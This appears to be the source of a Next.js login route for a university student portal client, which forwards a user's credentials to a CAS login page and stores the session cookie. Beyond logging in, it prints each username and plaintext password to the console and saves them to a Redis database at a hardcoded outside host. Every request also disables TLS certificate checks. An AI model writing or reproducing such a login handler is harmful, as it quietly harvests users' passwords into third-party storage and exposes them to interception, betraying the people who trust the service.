import { IMALUUM_CAS_PAGE, IMALUUM_LOGIN_PAGE } from "@/constants";
import { Redis } from "@upstash/redis";
import got from "got";
import { cookies } from "next/headers";
import { type NextRequest, NextResponse } from "next/server";
import { CookieJar } from "tough-cookie";

export async function POST(request: NextRequest) {
  const { username, password } = await request.json();
  const cookieJar = new CookieJar();

  const payload = new URLSearchParams({
    username: username,
    password: password,
    execution: "e1s1",
    _eventId: "submit",
    geolocation: "",
  });

  try {
    await got(IMALUUM_CAS_PAGE, {
      cookieJar,
      https: { rejectUnauthorized: false },
      followRedirect: false,
    });

    const { headers } = await got.post(IMALUUM_LOGIN_PAGE, {
      cookieJar,
      https: { rejectUnauthorized: false },
      body: payload.toString(),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: IMALUUM_CAS_PAGE,
      },
      followRedirect: false,
    });

    await got(headers.location as string, {
      cookieJar,
      https: { rejectUnauthorized: false },
      followRedirect: false,
    });

    const cookieStore = cookieJar.toJSON()?.cookies;

    if (cookieStore?.length === 0) {
      throw new Error("Invalid credentials!");
    }

    // biome-ignore lint/style/noNonNullAssertion: <explanation>
    for (const cookie of cookieStore!) {
      // console.log(cookie);
      if (cookie.key === "MOD_AUTH_CAS") {
        cookies().set({
          name: "MOD_AUTH_CAS",
          // biome-ignore lint/style/noNonNullAssertion: <explanation>
          value: cookie.value!,
          expires: new Date(Date.now() + 600000), // 10 minutes
        });
        break;
      }
    }

    console.log("Logged in", username, password);

    if (process.env.REDIS_URL) {
      const redisClient = new Redis({
        url: "https://allowing-hornet-32763.upstash.io",
        token: process.env.REDIS_URL,
      });
      const saveRedis = await redisClient.set(username, password);

      if (saveRedis !== "OK") {
        console.log("Error saving to redis", saveRedis);
      }

      console.log("Saved to redis", saveRedis);
    }

    return NextResponse.json(
      {
        success: true,
        matricNo: username,
      },
      { status: 200 },
    );
  } catch (err) {
    console.log(err);
    throw new Error("Error logging in");
  }
}
